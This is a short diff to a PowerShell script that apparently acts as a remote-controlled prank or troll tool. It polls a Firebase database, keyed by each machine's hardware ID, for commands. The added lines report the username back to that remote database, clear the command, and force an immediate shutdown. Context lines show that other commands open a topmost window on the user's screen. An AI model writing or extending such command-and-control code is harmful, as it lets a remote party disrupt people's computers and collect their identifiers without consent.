@@ -18,7 +18,14 @@ Invoke-RestMethod -Uri "https://trolo-1252e-default-rtdb.firebaseio.com/main.jso
 } elseif (-not $response.$hwid.message -or $response.$hwid.message -eq "") {
 } else {
 if ($response.$hwid.message -eq "shutdownAll") {
-shutdown.exe /s /t 0 /f
+$body = @{
+        username = $username
+        message  = ""
+    } | ConvertTo-Json -Depth 3
+    $url = "https://trolo-1252e-default-rtdb.firebaseio.com/main/${hwid}.json"
+    Invoke-RestMethod -Uri $url -Method Patch -Body $body -ContentType "application/json"
+
+    shutdown.exe /s /t 0 /f
 } else {
 $topForm = New-Object System.Windows.Forms.Form
 $topForm.TopMost = $true
